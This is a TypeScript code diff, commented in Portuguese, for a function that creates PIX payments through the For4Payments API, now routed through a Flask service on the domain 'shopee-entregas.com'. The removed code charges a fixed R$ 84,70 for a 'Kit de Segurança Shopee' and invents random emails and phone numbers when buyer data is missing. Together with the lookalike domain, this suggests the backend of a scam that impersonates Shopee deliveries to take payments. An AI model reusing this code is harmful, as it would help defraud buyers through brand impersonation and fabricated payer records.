@@ -9,157 +9,44 @@ interface For4PaymentsData {
 }
 
 /**
- * Ponte para a API For4Payments - versão TypeScript
- * Esta função envia uma requisição diretamente para a API For4Payments
- * Adaptada para funcionar no Heroku com Node.js 22
+ * Wrapper para chamar a API Flask for4payments
  */
 export async function createFor4Payment(data: For4PaymentsData) {
   try {
-    console.log('Processando pagamento via For4Payments API:', data);
+    console.log('Processando pagamento via API For4Payments:', data);
     
-    // Verificar se a chave secreta está configurada
-    const secretKey = process.env.FOR4PAYMENTS_SECRET_KEY;
-    if (!secretKey) {
-      throw new Error('Chave de API For4Payments não configurada (FOR4PAYMENTS_SECRET_KEY)');
+    // Definir a URL do serviço Flask (prod vs dev)
+    let apiUrl = process.env.FOR4PAYMENTS_API_URL || 'https://shopee-entregas.com/api/for4payments';
+    
+    // Em desenvolvimento, use localhost
+    if (process.env.NODE_ENV === 'development') {
+      apiUrl = 'http://localhost:5000/api/for4payments';
     }
     
-    // Formatar CPF (remover caracteres não numéricos)
-    const cpf = data.cpf.replace(/\D/g, '');
+    console.log(`FOR4PAYMENTS_API_URL: ${process.env.FOR4PAYMENTS_API_URL || 'não definido'}`);
+    console.log(`NODE_ENV: ${process.env.NODE_ENV || 'não definido'}`);
     
-    // Valor fixo para o kit de segurança: R$ 84,70 (em centavos = 8470)
-    const amountInCents = 8470;
+    console.log(`Enviando solicitação para: ${apiUrl}`);
     
-    // Formato do telefone (remover caracteres não numéricos ou gerar um aleatório)
-    const phone = data.telefone ? data.telefone.replace(/\D/g, '') : generateRandomPhone();
+    // Chamar a API Flask via HTTP
+    const response = await axios.post(apiUrl, data, {
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      timeout: 30000
+    });
     
-    // Preparar dados para a API For4Payments
-    const paymentData = {
-      name: data.nome,
-      email: data.email || generateRandomEmail(data.nome),
-      cpf: cpf,
-      phone: phone,
-      paymentMethod: 'PIX',
-      amount: amountInCents,
-      items: [{
-        title: 'Kit de Segurança Shopee',
-        quantity: 1,
-        unitPrice: amountInCents,
-        tangible: true
-      }]
-    };
+    console.log('Resultado da API For4Payments:', response.status);
     
-    // URL da API
-    const apiUrl = process.env.FOR4PAYMENTS_API_URL || 'https://app.for4payments.com.br/api/v1';
-    
-    // Configurar headers
-    const headers = {
-      'Authorization': secretKey,
-      'Content-Type': 'application/json',
-      'Accept': 'application/json',
-      'User-Agent': 'Mozilla/5.0 (Node.js 22) Application/1.0',
-      'X-Requested-With': 'XMLHttpRequest',
-      'X-Cache-Buster': Date.now().toString(),
-      'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
-    };
-    
-    console.log(`Enviando requisição para ${apiUrl}/transaction.purchase`);
-    
-    // Chamar API For4Payments
-    const response = await axios.post(
-      `${apiUrl}/transaction.purchase`,
-      paymentData,
-      { headers, timeout: 30000 }
-    );
-    
-    console.log('Resposta da API For4Payments:', response.status);
-    
-    if (response.status === 200) {
-      // Extrair dados da resposta
-      const responseData = response.data;
-      console.log('Dados da transação recebidos');
-      
-      // Mapeamento de campos de resposta para lidar com diferentes formatos
-      let pixCode = null;
-      let pixQrCode = null;
-      
-      // Verificar campos de código PIX em vários formatos possíveis
-      if (responseData.pixCode) pixCode = responseData.pixCode;
-      else if (responseData.copy_paste) pixCode = responseData.copy_paste;
-      else if (responseData.code) pixCode = responseData.code;
-      else if (responseData.pix_code) pixCode = responseData.pix_code;
-      else if (responseData.pix?.code) pixCode = responseData.pix.code;
-      else if (responseData.pix?.copy_paste) pixCode = responseData.pix.copy_paste;
-      else if (responseData.pix?.pixCode) pixCode = responseData.pix.pixCode;
-      
-      // Verificar campos de QR code em vários formatos possíveis
-      if (responseData.pixQrCode) pixQrCode = responseData.pixQrCode;
-      else if (responseData.qr_code_image) pixQrCode = responseData.qr_code_image;
-      else if (responseData.qr_code) pixQrCode = responseData.qr_code;
-      else if (responseData.pix_qr_code) pixQrCode = responseData.pix_qr_code;
-      else if (responseData.pix?.qrCode) pixQrCode = responseData.pix.qrCode;
-      else if (responseData.pix?.qr_code_image) pixQrCode = responseData.pix.qr_code_image;
-      else if (responseData.pix?.pixQrCode) pixQrCode = responseData.pix.pixQrCode;
-      
-      // Caso não haja QR code na resposta, gere um
-      if (!pixQrCode && pixCode) {
-        pixQrCode = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`;
-      }
-      
-      // Verificar e organizar a resposta final
-      if (!pixCode) {
-        throw new Error('Código PIX não encontrado na resposta da API');
-      }
-      
-      // Formar resposta final
-      return {
-        id: responseData.id || responseData.transactionId || `tx_${Date.now()}`,
-        pixCode: pixCode,
-        pixQrCode: pixQrCode || '',
-        status: responseData.status || 'pending',
-        createdAt: new Date().toISOString()
-      };
-    } else {
-      throw new Error(`Erro ao processar pagamento: ${response.statusText}`);
-    }
+    // Retornar os dados
+    return response.data;
   } catch (error: any) {
-    console.error('Erro na API For4Payments:', error.message);
+    console.error('Erro ao processar pagamento via API For4Payments:', error.message);
     
     if (error.response) {
       console.error('Detalhes do erro:', error.response.data);
     }
     
-    // Se estivermos em ambiente de desenvolvimento, podemos retornar um código de fallback
-    if (process.env.NODE_ENV === 'development') {
-      console.log('Gerando código PIX de fallback para desenvolvimento');
-      
-      const fallbackResponse = {
-        id: `fallback_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
-        pixCode: "00020126580014BR.GOV.BCB.PIX0136f5f04a2d-ecec-4072-955c-9e1d44c5060a0224Pagamento Kit Seguranca5204000053039865406107.805802BR5909ShopeeKit6009Sao Paulo62100506codigo6304E57B",
-        pixQrCode: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX0136f5f04a2d-ecec-4072-955c-9e1d44c5060a0224Pagamento Kit Seguranca5204000053039865406107.805802BR5909ShopeeKit6009Sao Paulo62100506codigo6304E57B`,
-        status: 'pending',
-        createdAt: new Date().toISOString()
-      };
-      
-      console.warn('ATENÇÃO: Usando código PIX de fallback apenas para desenvolvimento!');
-      return fallbackResponse;
-    }
-    
-    // Em produção, propagar o erro
-    throw new Error(`Falha ao processar pagamento via For4Payments: ${error.message || 'Erro desconhecido'}`);
+    throw new Error(`Falha ao processar pagamento: ${error.message}`);
   }
-}
-
-// Funções auxiliares
-function generateRandomEmail(name: string): string {
-  const cleanName = name.toLowerCase().replace(/[^a-z0-9]/g, '');
-  const randomNum = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
-  const domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
-  const domain = domains[Math.floor(Math.random() * domains.length)];
-  return `${cleanName}${randomNum}@${domain}`;
-}
-
-function generateRandomPhone(): string {
-  const ddd = Math.floor(Math.random() * (99 - 11 + 1) + 11).toString();
-  const number = Math.floor(Math.random() * 1000000000).toString().padStart(9, '0');
-  return `${ddd}${number}`;
 }
